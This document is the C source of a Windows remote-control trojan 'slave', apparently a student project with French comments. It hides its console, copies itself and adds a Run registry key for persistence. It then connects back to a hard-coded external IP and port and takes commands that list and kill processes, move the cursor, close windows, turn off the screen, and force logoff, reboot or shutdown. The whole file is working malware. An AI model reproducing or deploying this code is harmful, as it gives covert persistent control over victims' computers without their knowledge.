#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

HANDLE MyProcess;

SOCKET S_slave;
SOCKADDR_IN Slave;
WSADATA wsaData;

HANDLE hToken; /* Handle vers les privilèges du processus*/
TOKEN_PRIVILEGES tkp; /* Structure permettant de représenter un groupe de privilèges */

HANDLE hConsole;
HKEY key;

/**Rend invisible la console en récupérant son handle code source trouvé sur le site "codesources"**/
 HWND GetConsoleHwnd(void)
 {
 #define MY_BUFSIZE 1024 // Buffer size for console window titles.
 HWND hwndFound; // This is what is returned to the caller.
 char pszNewWindowTitle[MY_BUFSIZE]; // Contains fabricated
 // WindowTitle.
 char pszOldWindowTitle[MY_BUFSIZE]; // Contains original
 // WindowTitle.
 // Fetch current window title.
 GetConsoleTitle(pszOldWindowTitle, MY_BUFSIZE);
 // Format a "unique" NewWindowTitle.
 wsprintf(pszNewWindowTitle,"%d/%d",
 GetTickCount(),
 GetCurrentProcessId());
 // Change current window title.
 SetConsoleTitle(pszNewWindowTitle);
 // Ensure window title has been updated.
 Sleep(40);
 // Look for NewWindowTitle.
 hwndFound=FindWindow(NULL, pszNewWindowTitle);
 // Restore original window title.
 SetConsoleTitle(pszOldWindowTitle);
 return(hwndFound);
 }

void Token()
{
    /* Il faut obtenir un handle vers les privilèges du processus qui nous intéresse.*/
    /* Handle du processus                                        */
    /* Ce que nous souhaitons faire avec le Token Handle          */
    /* Sortie                                                     */
	 OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY|TOKEN_ALL_ACCESS, &hToken);
    /* SE_SHUTDOWN_NAME ("SeShutdownPrivilege") est requis pour pouvoir éteindre l'ordinateur. */
    /* Récupérons le LUID de ce privilège.*/
    /* Sur quelle machine ?                                   */
    /* Nom du privilège dont le LUID nous intéresse           */
    /* Sortie                                                 */
	 LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
	 tkp.PrivilegeCount = 1;
	 tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    /* Token Handle                                         */
    /* Désactiver tous les privilèges ? (DAP)               */
    /* Nouvel état (ignoré si DAP vaut TRUE)                */
    /* sizeof(old_state)                                    */
    /* &old_state                                           */
    /* &retun_length                                        */
	 AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,(PTOKEN_PRIVILEGES)NULL, 0);
}
void InitSocket();

void SetVersion(WSADATA *w)
{
    // Version de WINSOCK 2.0
    WSAStartup(MAKEWORD(2, 0), w);
}

void NewSocket(SOCKET *Socket)
{
    // Création du Socket s (protocol family:TCP/IP,Socket orienté connexion,Protocole TCP)
    *Socket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
}

void SetStruct(SOCKADDR_IN *Struct,char *ip,int port)
{
    // Address Family
    Struct->sin_family       = AF_INET;
    // Definition de l'adresse du serveur & Convert Ip to Int
    Struct->sin_addr.s_addr  = inet_addr(ip);
    // Definition du port
    Struct->sin_port         = htons(port);
    memset(&Struct->sin_zero, '\0', sizeof(Struct->sin_zero));
}

int Connect(SOCKET Socket,SOCKADDR_IN *Struct)
{
    if (connect(Socket, (SOCKADDR *)Struct, sizeof(*Struct)) == SOCKET_ERROR)
    return 0;
    else return 1;
}


void StopLink(SOCKET S_slave)
{
    shutdown(S_slave, SD_SEND);
    closesocket(S_slave);
    WSACleanup();
}
/*
TestSocket(S_slave)
{
    char buffer[2]="";
    strcpy(buffer,"1");
    send(S_slave,buffer,(int)strlen(buffer),0);
}
*/
void GetPid(SOCKET S_slave)
{
    HANDLE hSnapShot;
    PROCESSENTRY32 pe={0};
    char buffer[100]="";
    char Recu[1];
    int Pid;
    int n;
    // Demander une vue de tous les processus en cours
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe.dwSize = sizeof(PROCESSENTRY32);
    // Afficher les résultats
    if (Process32First(hSnapShot, &pe))
    {
        do
        {
            strcpy(buffer,TEXT(pe.szExeFile));
            send(S_slave, buffer, (int)strlen(buffer), 0);
            n = recv(S_slave, Recu, sizeof(Recu), 0);

            Pid=pe.th32ProcessID;
            sprintf(buffer, "%d",Pid );
            send(S_slave, buffer, (int)strlen(buffer), 0);
            n = recv(S_slave, Recu, sizeof(Recu), 0);

        }while (Process32Next(hSnapShot, &pe));
    }
    strcpy(buffer, "-1");
    send(S_slave, buffer, (int)strlen(buffer), 0);
    CloseHandle(hSnapShot);
}

void KillPid(SOCKET S_slave)
{
    int n;
    int Result=0;
    char buffer[100];
    int Pid;
    send(S_slave, "1", 1, 0);
    n = recv(S_slave, buffer, sizeof(buffer), 0);
    buffer[n] = '\0';
    Pid=atoi(buffer);
    MyProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,(DWORD)Pid);

    if(MyProcess)
    {
        Result=TerminateProcess(MyProcess,1);
        CloseHandle(MyProcess);
        if(!Result)
            send(S_slave, "0", 1, 0);
            else
                send(S_slave, "1", 1, 0);

    }
    else
    {
       send(S_slave, "1", 1, 0);
    }

}
/** Wizz de la fenêtre active **/
void Wizz()
{
    int i=0;
    //Récuperer le handle de la fenetre au premier plan
    HWND hwnd=GetForegroundWindow();
    RECT Rect;
    //on attend un peu pour produire un meilleur effet de surprise
    Sleep(500);
    //Récuperation des dimenssion de la fenetre
    GetWindowRect(hwnd, &Rect);

    for(i=0;i<20;i++)
   {
      MoveWindow(hwnd, Rect.left+2, Rect.top-2, Rect.right - Rect.left, Rect.bottom - Rect.top, TRUE);
      Sleep(15);
      MoveWindow(hwnd, Rect.left-2, Rect.top-2, Rect.right - Rect.left, Rect.bottom - Rect.top, TRUE);
      Sleep(15);
      MoveWindow(hwnd, Rect.left+2, Rect.top+2, Rect.right - Rect.left, Rect.bottom - Rect.top, TRUE);
      Sleep(15);
      MoveWindow(hwnd, Rect.left-2, Rect.top+2, Rect.right - Rect.left, Rect.bottom - Rect.top, TRUE);
      Sleep(15);
      MoveWindow(hwnd, Rect.left+2, Rect.top-2, Rect.right - Rect.left, Rect.bottom - Rect.top, TRUE);
      Sleep(15);
      MoveWindow(hwnd, Rect.left+2, Rect.top+2, Rect.right - Rect.left, Rect.bottom - Rect.top, TRUE);
      Sleep(15);
   }
}
void CloseWindowA()
{
    HWND hwnd=GetForegroundWindow();
    PostMessage(hwnd, WM_CLOSE, 0, 0);
    //SendMessage(hwnd, WM_CLOSE, 0, 0);
}
void ScreenOff()
{
    DefWindowProc(GetDesktopWindow(), WM_SYSCOMMAND, SC_MONITORPOWER, 1);
    Sleep(2000);
    DefWindowProc(GetDesktopWindow(), WM_SYSCOMMAND, SC_MONITORPOWER, -1);
}
/**MoveCursor**/
void MoveCursor()
{
    int x,y,n;
    char buffer[100];
    send(S_slave, "1", 1, 0);
    n = recv(S_slave, buffer, sizeof(buffer), 0);
    buffer[n] = '\0';
    x=atoi(buffer);
    send(S_slave, "1", 1, 0);
    n = recv(S_slave, buffer, sizeof(buffer), 0);
    y=atoi(buffer);

    DestroyCursor(GetCursor());
    SetCursorPos(x, y);

    send(S_slave, "1", 1, 0);

}

/**LogOff**/
void LogOff()
{
    ExitWindowsEx(EWX_LOGOFF, 0);
}
/**Reboot**/
void Reboot()
{
    Token();
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}
/**ShutDown**/
void ShutDown()
{
    Token();
    ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0);
}
/**GetClientName**/
void GetClientName()
{
    char buffer[100];
    gethostname(buffer,sizeof(buffer));
    send(S_slave, buffer, (int)strlen(buffer), 0);
}
/**GetClientName**/
void PowerState()
{
    SetSystemPowerState(FALSE, 0);
}

void Evaluate(int choix,SOCKET S_slave)
{
    switch (choix)
    {
        case 0:
            GetClientName(S_slave);
        break;
        case 1:
            GetPid(S_slave);
        break;
        case 11:
            KillPid(S_slave);
        break;
        case 2:
            Wizz();
        break;
        case 3:
            LogOff();
        break;
        case 4:
            Reboot();
        break;
        case 5:
            ShutDown();
        break;
        case 6:
            PowerState();
        break;
        case 7:
            MoveCursor();
        break;
        case 8:
            CloseWindowA();
        break;
        case 9:
            ScreenOff();
        break;
        case 99:
            //TestSocket();
        break;
    }
}

void BeginLink(SOCKET S_slave)
{
    char buffer[2]="";
    int n;
    int choix;
    n = recv(S_slave, buffer, sizeof(buffer) - 1, 0);

    while(n != SOCKET_ERROR)
    {
        buffer[n] = '\0';
        choix=atoi(buffer);
        Evaluate(choix,S_slave);
        n = recv(S_slave, buffer, sizeof(buffer), 0);
    }
    StopLink(S_slave);
    InitSocket();
}

void BeginConnect(SOCKET S_slave,SOCKADDR_IN Slave)
{
    int quit=0;
    while(quit!=-1)
    {
        if(Connect(S_slave,&Slave)>0)
        {
            BeginLink(S_slave);
        }
    }

}

    void InitSocket()
{
  // Version Winsock
    SetVersion(&wsaData);
    // New Socket
    NewSocket(&S_slave);
    // Structure
    SetStruct(&Slave,"88.171.27.49",5050);
    // Connect
    BeginConnect(S_slave,Slave);
}
/**
Déplace le slave et le lance automatiquement à chaque demarrage du pc distant
(Problème de droits avec vista où xp en mode non administrateur)
**/
void Install()
{
    MoveFileEx("SlaveFinal.exe","C:\\Documents and Settings\\SlaveFinal.exe",MOVEFILE_COPY_ALLOWED|MOVEFILE_REPLACE_EXISTING);
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0,
                    KEY_ALL_ACCESS,
                    &key);
    RegSetValueEx(key, "SlaveFinal", 0, REG_SZ, """C:\\Documents and settings\\SlaveFinal.exe""", lstrlen("""C:\\Documents and settings\\esgi\\SlaveFinal.exe"""));
    RegCloseKey(key);
}

int main()
{
    hConsole = GetConsoleHwnd();
    ShowWindow(hConsole, SW_HIDE);
    Install();
    InitSocket();

    return 0;

}
